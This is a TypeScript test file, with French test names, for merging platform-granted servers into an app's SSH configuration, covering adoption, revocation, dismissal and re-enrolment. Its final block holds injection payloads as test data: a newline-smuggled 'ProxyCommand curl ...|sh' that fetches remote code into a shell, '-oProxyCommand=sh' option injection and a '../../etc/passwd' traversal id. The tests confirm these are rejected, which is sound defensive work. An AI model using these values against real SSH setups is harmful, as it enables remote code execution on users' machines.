import { describe, expect, it } from "bun:test";
import type { FleetServer, Server, ServerGrant } from "@shared/servers";
import { grantOpens, grantPending, grantWithdrawn } from "@shared/servers";
import { mergeFleet } from "../fleet-run";
import { appSshPaths, renderSshConfig, sshArgs } from "../ssh-config";

const DEVICE_KEY = "/data/keys/device";

const PATHS = appSshPaths("/data", "/home/jean");

const GRANTED: FleetServer = {
  host: "203.0.113.10",
  hostFingerprint: "SHA256:atelier",
  id: "srv-platform-1",
  keyReady: true,
  name: "vps-atelier",
  organization: { id: "org-1", name: "Flyleaf" },
  port: 22,
  status: "active",
  user: "dev",
};

const TYPED: Server = {
  host: "203.0.113.10",
  id: "srv-local-1",
  keyPath: "/data/keys/srv-local-1",
  name: "Mon serveur",
  origin: "app",
  port: 22,
  user: "root",
};

function merge(
  local: Server[],
  granted: FleetServer[],
  active: string | null = null,
  dismissed: string[] = []
) {
  return mergeFleet({
    active,
    deviceKeyPath: DEVICE_KEY,
    dismissed,
    granted,
    local,
  });
}

function grantOf(servers: readonly Server[]): ServerGrant {
  const found = servers[0]?.grant;

  if (!found) {
    throw new Error("le serveur n'a pas d'attribution");
  }

  return found;
}

describe("un serveur attribué", () => {
  it("entre dans la liste avec l'adresse et la clé que personne n'a saisies", () => {
    const merged = merge([], [GRANTED]);

    expect(merged.adopted).toEqual(["srv-platform-1"]);
    expect(merged.config.servers).toEqual([
      {
        grant: {
          adopted: true,
          id: "srv-platform-1",
          keyReady: true,
          listed: true,
          opened: false,
          status: "active",
        },
        host: "203.0.113.10",
        hostFingerprint: "SHA256:atelier",
        id: "srv-platform-1",
        keyPath: DEVICE_KEY,
        name: "vps-atelier",
        origin: "app",
        port: 22,
        slug: "vps-atelier",
        user: "dev",
      },
    ]);
  });

  it("laisse son nom SSH à un serveur d'ici qui le porte déjà", () => {
    const merged = merge(
      [{ ...TYPED, host: "198.51.100.7", slug: "vps-atelier" }],
      [GRANTED]
    );

    expect(merged.config.servers.map((server) => server.slug)).toEqual([
      "vps-atelier",
      undefined,
    ]);
  });

  it("devient le serveur piloté quand l'app n'en avait aucun", () => {
    expect(merge([], [GRANTED]).config.active).toBe("srv-platform-1");
  });

  it("laisse le serveur piloté en place quand il y en avait déjà un", () => {
    expect(merge([TYPED], [GRANTED], "srv-local-1").config.active).toBe(
      "srv-local-1"
    );
  });

  it("s'ouvre par la configuration SSH de l'app, sur la clé de l'appareil", () => {
    const [server] = merge([], [GRANTED]).config.servers;

    expect(sshArgs(server, PATHS)).toEqual([
      "-F",
      "/data/ssh/config",
      "pupitre-srv-platform-1",
    ]);

    const written = renderSshConfig([server], PATHS, "darwin");

    expect(written).toContain("Host pupitre-srv-platform-1");
    expect(written).toContain("HostName 203.0.113.10");
    expect(written).toContain("User dev");
    expect(written).toContain(`IdentityFile ${DEVICE_KEY}`);
    expect(written).toContain("StrictHostKeyChecking yes");
  });

  it("suit l'adresse et le compte que la plateforme publie ensuite", () => {
    const [adopted] = merge([], [GRANTED]).config.servers;
    const moved = merge(
      [adopted],
      [{ ...GRANTED, host: "203.0.113.11", port: 2222, user: "ada" }]
    );

    expect(moved.adopted).toEqual([]);
    expect(moved.config.servers[0]).toMatchObject({
      host: "203.0.113.11",
      id: "srv-platform-1",
      port: 2222,
      user: "ada",
    });
  });

  it("garde le nom que la personne lui a donné ici", () => {
    const [adopted] = merge([], [GRANTED]).config.servers;
    const renamed = { ...adopted, name: "Atelier" };

    expect(merge([renamed], [GRANTED]).config.servers[0].name).toBe("Atelier");
  });

  it("n'entre pas dans la liste tant que la plateforme n'a pas son adresse", () => {
    const merged = merge([], [{ ...GRANTED, host: null }]);

    expect(merged.config.servers).toEqual([]);
    expect(merged.adopted).toEqual([]);
  });
});

describe("un serveur déjà connu de l'app", () => {
  it("reçoit son attribution sans être ajouté une seconde fois", () => {
    const merged = merge([TYPED], [GRANTED], "srv-local-1");

    expect(merged.config.servers).toHaveLength(1);
    expect(merged.adopted).toEqual([]);
    expect(merged.config.servers[0]).toMatchObject({
      grant: { adopted: false, id: "srv-platform-1", listed: true },
      id: "srv-local-1",
    });
  });

  it("garde le compte que le durcissement a ouvert ici", () => {
    const hardened = { ...TYPED, user: "dev" };
    const merged = merge([hardened], [{ ...GRANTED, user: "root" }]);

    expect(merged.config.servers[0].user).toBe("dev");
  });

  it("garde sa propre clé plutôt que celle de l'appareil", () => {
    expect(merge([TYPED], [GRANTED]).config.servers[0].keyPath).toBe(
      "/data/keys/srv-local-1"
    );
  });

  it("épingle l'empreinte que la plateforme publie s'il n'en avait aucune", () => {
    expect(merge([TYPED], [GRANTED]).config.servers[0].hostFingerprint).toBe(
      "SHA256:atelier"
    );
  });

  it("ne suit pas une adresse de la plateforme une fois lié", () => {
    const linked = merge([TYPED], [GRANTED]).config.servers;
    const moved = merge(linked, [{ ...GRANTED, host: "203.0.113.99" }]);

    expect(moved.config.servers[0].host).toBe("203.0.113.10");
  });

  it("reste intact quand la plateforme ne le connaît pas", () => {
    const merged = merge([TYPED], []);

    expect(merged.config.servers).toEqual([TYPED]);
    expect(merged.withdrawn).toEqual([]);
  });
});

describe("la révocation", () => {
  it("efface le serveur que la plateforme ne liste plus, puisqu'elle l'avait posé", () => {
    const [adopted] = merge([], [GRANTED]).config.servers;
    const merged = merge([adopted], []);

    expect(merged.config.servers).toEqual([]);
    expect(merged.released).toEqual(["srv-platform-1"]);
    expect(merged.changed).toBe(true);
  });

  it("efface le serveur que la plateforme rend révoqué", () => {
    const [adopted] = merge([], [GRANTED]).config.servers;
    const merged = merge([adopted], [{ ...GRANTED, status: "revoked" }]);

    expect(merged.config.servers).toEqual([]);
    expect(merged.released).toEqual(["srv-platform-1"]);
  });

  it("garde le serveur qu'on avait saisi ici, attribution tombée ou non", () => {
    const bound = merge([TYPED], [GRANTED]).config.servers;
    const merged = merge(bound, []);

    expect(merged.released).toEqual([]);
    expect(merged.config.servers[0].grant).toMatchObject({ listed: false });
  });

  it("rend un serveur suspendu au premier signe de retour", () => {
    const [adopted] = merge([], [GRANTED]).config.servers;
    const suspended = merge([adopted], [{ ...GRANTED, status: "suspended" }]);
    const back = merge(suspended.config.servers, [GRANTED]);

    expect(suspended.config.servers).toHaveLength(1);
    expect(back.withdrawn).toEqual([]);
    expect(back.config.servers[0].grant).toMatchObject({ status: "active" });
  });
});

describe("le retrait sur cet ordinateur", () => {
  it("ne réadopte pas un serveur attribué qu'on avait retiré", () => {
    const merged = merge([], [GRANTED], null, ["srv-platform-1"]);

    expect(merged.config.servers).toEqual([]);
    expect(merged.adopted).toEqual([]);
  });

  it("garde la mémoire du retrait tant que la plateforme l'attribue", () => {
    expect(
      merge([], [GRANTED], null, ["srv-platform-1"]).config.dismissed
    ).toEqual(["srv-platform-1"]);
  });

  it("oublie le retrait dès que la plateforme cesse de l'attribuer", () => {
    const merged = merge([], [], null, ["srv-platform-1"]);

    expect(merged.config.dismissed).toEqual([]);
    expect(merged.changed).toBe(true);
  });

  it("rend le serveur dès que la mémoire du retrait est effacée", () => {
    expect(merge([], [GRANTED], null, []).config.servers).toHaveLength(1);
  });
});

describe("le réenrôlement", () => {
  const REENROLLED: FleetServer = { ...GRANTED, id: "srv-platform-2" };

  it("suit la même machine sous son nouvel identifiant, sans la dédoubler", () => {
    const [adopted] = merge([], [GRANTED]).config.servers;
    const merged = merge([adopted], [REENROLLED]);

    expect(merged.config.servers).toHaveLength(1);
    expect(merged.config.servers[0].grant).toMatchObject({
      id: "srv-platform-2",
      listed: true,
    });
  });

  it("suit aussi un serveur qu'on avait saisi ici", () => {
    const bound = merge([TYPED], [GRANTED]).config.servers;
    const merged = merge(bound, [REENROLLED]);

    expect(merged.config.servers).toHaveLength(1);
    expect(merged.config.servers[0].id).toBe("srv-local-1");
    expect(merged.config.servers[0].grant).toMatchObject({
      adopted: false,
      id: "srv-platform-2",
    });
  });

  it("ne confond pas deux serveurs que la plateforme liste toujours tous les deux", () => {
    const [adopted] = merge([], [GRANTED]).config.servers;
    const merged = merge([adopted], [GRANTED, REENROLLED]);

    expect(merged.config.servers).toHaveLength(2);
    expect(merged.config.servers[0].grant).toMatchObject({
      id: "srv-platform-1",
    });
  });
});

describe("l'état d'une attribution", () => {
  it("s'ouvre quand la plateforme la liste, active, la clé prête", () => {
    expect(grantOpens(grantOf(merge([], [GRANTED]).config.servers))).toBe(true);
  });

  it("attend tant que la plateforme n'a aucune clé de ce compte", () => {
    const waiting = grantOf(
      merge([], [{ ...GRANTED, keyReady: false }]).config.servers
    );

    expect(grantPending(waiting)).toBe(true);
    expect(grantOpens(waiting)).toBe(false);
  });

  it("attend tant que le serveur s'enrôle", () => {
    const enrolling = grantOf(
      merge([], [{ ...GRANTED, status: "enrolling" }]).config.servers
    );

    expect(grantPending(enrolling)).toBe(true);
  });

  it("est retirée dès que la plateforme cesse de la lister", () => {
    const bound = merge([TYPED], [GRANTED]).config.servers;
    const gone = grantOf(merge(bound, []).config.servers);

    expect(grantWithdrawn(gone)).toBe(true);
    expect(grantPending(gone)).toBe(false);
  });
});

describe("la fusion", () => {
  it("dit que rien n'a changé quand rien n'a changé", () => {
    const first = merge([], [GRANTED]);
    const again = merge(first.config.servers, [GRANTED], first.config.active);

    expect(first.changed).toBe(true);
    expect(again.changed).toBe(false);
  });

  it("ne touche pas à un hôte du système", () => {
    const system: Server = {
      host: "atelier",
      id: "srv-system",
      name: "atelier",
      origin: "system",
      port: 22,
      user: "",
    };

    expect(merge([system], [GRANTED]).config.servers[0]).toEqual(system);
  });
});

describe("une attribution qui porterait une directive SSH", () => {
  const INJECTION = "x\nProxyCommand curl a.bc|sh";

  const UNFIT: FleetServer[] = [
    { ...GRANTED, user: INJECTION },
    { ...GRANTED, user: "-oProxyCommand=sh" },
    { ...GRANTED, host: INJECTION },
    { ...GRANTED, host: "-oProxyCommand=sh" },
    { ...GRANTED, id: `srv${INJECTION}` },
    { ...GRANTED, id: "../../etc/passwd" },
    { ...GRANTED, port: 0 },
    { ...GRANTED, hostFingerprint: `SHA256:abc${INJECTION}` },
  ];

  it("n'entre jamais dans la liste", () => {
    for (const granted of UNFIT) {
      const merged = merge([], [granted]);

      expect(merged.adopted).toEqual([]);
      expect(merged.config.servers).toEqual([]);
    }
  });

  it("laisse à un serveur déjà adopté l'adresse et le compte qu'il avait", () => {
    const [adopted] = merge([], [GRANTED]).config.servers;

    for (const granted of UNFIT.filter((unfit) => unfit.id === GRANTED.id)) {
      const [kept] = merge([adopted], [granted]).config.servers;

      expect(kept?.host).toBe("203.0.113.10");
      expect(kept?.user).toBe(GRANTED.user);
      expect(kept?.port).toBe(GRANTED.port);
      expect(kept?.hostFingerprint).toBe("SHA256:atelier");
      expect(
        renderSshConfig(merge([adopted], [granted]).config.servers, PATHS)
      ).not.toContain("ProxyCommand");
    }
  });

  it("ne prête pas son empreinte à un serveur tapé ici", () => {
    const [kept] = merge(
      [TYPED],
      [{ ...GRANTED, hostFingerprint: `SHA256:abc${INJECTION}` }]
    ).config.servers;

    expect(kept?.hostFingerprint).toBeUndefined();
  });
});
